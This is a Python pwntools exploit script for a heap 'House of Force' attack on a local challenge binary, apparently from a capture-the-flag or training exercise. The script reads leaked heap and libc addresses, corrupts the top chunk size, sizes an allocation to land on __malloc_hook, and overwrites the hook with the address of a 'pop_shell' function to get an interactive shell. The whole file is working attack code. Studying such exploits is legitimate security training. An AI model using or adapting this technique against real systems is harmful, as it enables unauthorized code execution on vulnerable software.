#!/usr/bin/env python3
'''
House of Force Starter
'''

from pwn import * 

libc_name='./libc-2.23.so'
env = {}
context.log_level = 'error'  # or 'critical' to silence
# Binary setup
elf_name = './shining_moments_patched'

elf = ELF(elf_name)
libc = ELF(libc_name)
ld = ELF("./ld-2.23.so")
env = {"LD_PRELOAD": libc.path}

# Process creation 
# p = gdb.debug([elf.path], env=env)
p = process([elf.path])

def get_leaks(): 
	p.recvuntil(b": ")
	heap_base = int(p.recvuntil(b"\n"), 16)

	p.recvuntil(b": ") 

	libc_offset = 0x3f520 # Offset from leak (system) to libc base
	libc_leak = int(p.recvuntil(b"\n"), 16) 
	libc_base = libc_leak - libc_offset


	p.recvuntil(b": ") 
	stack_leak = int(p.recvuntil(b"\n"), 16) 
	# stack_base = stack_leak - stack_offset Kind of unpredictable...
	
	print("LibC Base: {}".format(hex(libc_base)))
	print("Heap Base: {}".format(hex(heap_base)))
	print("Stack Leak: {}".format(hex(stack_leak)))
	return heap_base, libc_base

def corrupt_topchunk():
	print("Overwriting the top chunk size")
	prev_size = "\x00" * 8 # Does not matter...
	size = "\xff" * 8
	p.sendlineafter(b"?", prev_size + size)


def calc_size_hook(heap_base, libc_base, malloc_hook_offset): 
	# Find the address of the __malloc_hook
	malloc_hook = libc_base + malloc_hook_offset	
	print("__malloc_hook address: {}".format(hex(malloc_hook)))
	
	# The top_chunk is at the heap_base currently
	top_chunk_loc = heap_base # The start of the top chunk is the same as the heap_base for this challenge
	

	# Get the relative location (from the heap) to the __malloc_hook
	size = malloc_hook - top_chunk_loc

	size = size - 0x10 - 0x10

	# Send the size 
	p.sendlineafter(b"?", (str(size)).encode())
	print("Size of allocation: ", hex(size))
	return size 

def code_exec(libc_base): 
	print("Writing to the 'target' location")	
	pop_shell = elf.symbols['pop_shell'] 
	p.sendlineafter(b";)", p64(pop_shell))	


## Offsets for 2.23
malloc_hook_offset = 0x3a03b0

heap_base, libc_base = get_leaks()

# gdb.attach(p)
corrupt_topchunk() 
calc_size_hook(heap_base, libc_base, malloc_hook_offset) # This one and the next one both do the same thing and work well
code_exec(libc_base) 
p.interactive()